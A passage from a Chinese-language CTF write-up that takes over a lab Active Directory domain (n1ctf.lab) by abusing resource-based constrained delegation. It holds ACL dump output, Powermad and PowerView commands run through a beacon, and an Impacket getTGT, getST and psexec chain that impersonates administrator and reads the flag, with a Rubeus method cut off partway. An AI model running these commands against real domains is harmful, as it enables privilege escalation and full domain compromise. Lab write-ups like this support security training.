    IsCallback : False
    OpaqueLength : 0
    AccessMask : 32
    SecurityIdentifier : S-1-5-21-3860493963-3742860931-3732056798-1105
    AceType : AccessAllowedObject
    AceFlags : None
    IsInherited : False
    InheritanceFlags : None
    PropagationFlags : None
    AuditFlags : None
    ObjectDN : CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
    ObjectSID : S-1-5-21-3860493963-3742860931-3732056798-1106
    ActiveDirectoryRights : Self
    ObjectAceFlags : ObjectAceTypePresent
    ObjectAceType : 72e39547-7b18-11d1-adef-00c04fd8d5cd
    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
    BinaryLength : 56
    AceQualifier : AccessAllowed
    IsCallback : False
    OpaqueLength : 0
    AccessMask : 8
    SecurityIdentifier : S-1-5-21-3860493963-3742860931-3732056798-1105
    AceType : AccessAllowedObject
    AceFlags : None
    IsInherited : False
    InheritanceFlags : None
    PropagationFlags : None
    AuditFlags : None
    ObjectDN : CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
    ObjectSID : S-1-5-21-3860493963-3742860931-3732056798-1106
    ActiveDirectoryRights : Self
    ObjectAceFlags : ObjectAceTypePresent
    ObjectAceType : f3a64788-5306-11d1-a9c5-0000f80367c1
    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
    BinaryLength : 56
    AceQualifier : AccessAllowed
    IsCallback : False
    OpaqueLength : 0
    AccessMask : 8
    SecurityIdentifier : S-1-5-21-3860493963-3742860931-3732056798-1105
    AceType : AccessAllowedObject
    AceFlags : None
    IsInherited : False
    InheritanceFlags : None
    PropagationFlags : None
    AuditFlags : None
    ObjectDN : CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
    ObjectSID : S-1-5-21-3860493963-3742860931-3732056798-1106
    ActiveDirectoryRights : WriteProperty
    ObjectAceFlags : ObjectAceTypePresent
    ObjectAceType : 4c164200-20c0-11d0-a768-00aa006e0529
    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
    BinaryLength : 56
    AceQualifier : AccessAllowed
    IsCallback : False
    OpaqueLength : 0
    AccessMask : 32
    SecurityIdentifier : S-1-5-21-3860493963-3742860931-3732056798-1105
    AceType : AccessAllowedObject
    AceFlags : None
    IsInherited : False
    InheritanceFlags : None
    PropagationFlags : None
    AuditFlags : None
    ObjectDN : CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
    ObjectSID : S-1-5-21-3860493963-3742860931-3732056798-1106
    ActiveDirectoryRights : ExtendedRight, GenericRead
    BinaryLength : 36
    AceQualifier : AccessAllowed
    IsCallback : False
    OpaqueLength : 0
    AccessMask : 131476
    SecurityIdentifier : S-1-5-21-3860493963-3742860931-3732056798-1105
    AceType : AccessAllowed
    AceFlags : None
    IsInherited : False
    InheritanceFlags : None
    PropagationFlags : None
    AuditFlags : None
    ObjectDN : CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
    ObjectSID : S-1-5-21-3860493963-3742860931-3732056798-1106
    ActiveDirectoryRights : Self
    ObjectAceFlags : ObjectAceTypePresent
    ObjectAceType : 9b026da6-0d3c-465c-8bee-5199d7165cba
    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
    BinaryLength : 56
    AceQualifier : AccessAllowed
    IsCallback : False
    OpaqueLength : 0
    AccessMask : 8
    SecurityIdentifier : S-1-5-21-3860493963-3742860931-3732056798-1105
    AceType : AccessAllowedObject
    AceFlags : Inherited
    IsInherited : True
    InheritanceFlags : None
    PropagationFlags : None
    AuditFlags : None
可以看到usera这个用户对USERA-PC这个计算机账户拥有WriteProperty权限
在域中有一个属性`MachineAccountQuota`，允许用户在域中创建的计算机机器帐户，默认为10
而计算机账户默认是注册`RestrictedKrbHost/domain`和`HOST/domain`这两个SPN的
所以这里刚好符合我们要求
使用powermad创建机器用户
    beacon> shell powershell Import-Module ./Powermad.ps1;"New-MachineAccount -MachineAccount ha1 -Password $(ConvertTo-SecureString 'evil' -AsPlainText -Force)"
    [*] Tasked beacon to run: powershell Import-Module ./Powermad.ps1;"New-MachineAccount -MachineAccount ha1 -Password $(ConvertTo-SecureString 'evil' -AsPlainText -Force)"
    [+] host called home, sent: 174 bytes
    [+] received output:
    [+] Machine account ha1 added
修改USERA-PC的`msDS-AllowedToActOnBehalfOfOtherIdentity`属性的值，使用`Powerview`
    shell powershell import-module ./powerview.ps1;"$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3860493963-3742860931-3732056798-1111)';
    $SDBytes = New-Object byte[] ($SD.BinaryLength);
    $SD.GetBinaryForm($SDBytes, 0);
    Get-DomainComputer USERA-PC| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose;"
验证是否成功添加
    beacon> shell powershell import-module ./powerview.ps1; Get-DomainComputer USERA-PC -Properties msds-allowedtoactonbehalfofotheridentity
    [*] Tasked beacon to run: powershell import-module ./powerview.ps1; Get-DomainComputer USERA-PC -Properties msds-allowedtoactonbehalfofotheridentity
    [+] host called home, sent: 153 bytes
    [+] received output:
    msds-allowedtoactonbehalfofotheridentity
    ----------------------------------------    {1, 0, 4, 128...}
### 方法1
利用配置好的资源约束委派，使用ha1$模拟administrator拿到一张票据并用psexec提权
    ha1c9on@ha1c9ondeMacBook-Pro ~ % getTGT.py n1ctf.lab/ha1\$:evil -dc-ip 10.233.33.9 Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation[*] Saving ticket in ha1$.ccacheha1c9on@ha1c9ondeMacBook-Pro ~ % export KRB5CCNAME=ha1\$.ccache ha1c9on@ha1c9ondeMacBook-Pro ~ % getST.py n1ctf.lab/ha1\$ -dc-ip 10.233.33.9 -spn HOST/USERA-PC -impersonate administrator -k -no-passImpacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation[*] Using TGT from cache[*] Impersonating administrator[*] Requesting S4U2self[*] Requesting S4U2Proxy[*] Saving ticket in administrator.ccacheha1c9on@ha1c9ondeMacBook-Pro ~ % export KRB5CCNAME=administrator.ccacheha1c9on@ha1c9ondeMacBook-Pro ~ % psexec.py n1ctf.lab/administrator@usera-pc -k -no-pass -dc-ip 10.233.33.9Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation[*] Requesting shares on usera-pc.....[*] Found writable share ADMIN$[*] Uploading file uNgdvAxj.exe[*] Opening SVCManager on usera-pc.....[*] Creating service bRYo on usera-pc.....[*] Starting service bRYo.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.1339](c) 2018 Microsoft Corporation. All rights reserved.C:\Windows\system32>hostnameUserA-PC
    C:\Windows\system32>type c:\flag.txt
    n1ctf{El_Psy_Kongroo_Zp4du8O51YTgHrH284ea}
### 方法2
    beacon> shell Rubeus.exe hash /user:ha1 /password:evil /domain:n1ctf.lab
    [*] Tasked beacon to run: Rubeus.exe hash /user:ha1 /password:evil /domain:n1ctf.lab
    [+] host called home, sent: 89 bytes
    [+] received output:
    ______ _
    (_____ \ | |
    _____) )_ _| |__ _____ _ _ ___
    | __ /| | | | _ \| ___ | | | |/___)
    | | \ \| |_| | |_) ) ____| |_| |___ |
    |_| |_|____/|____/|_____)____/(___/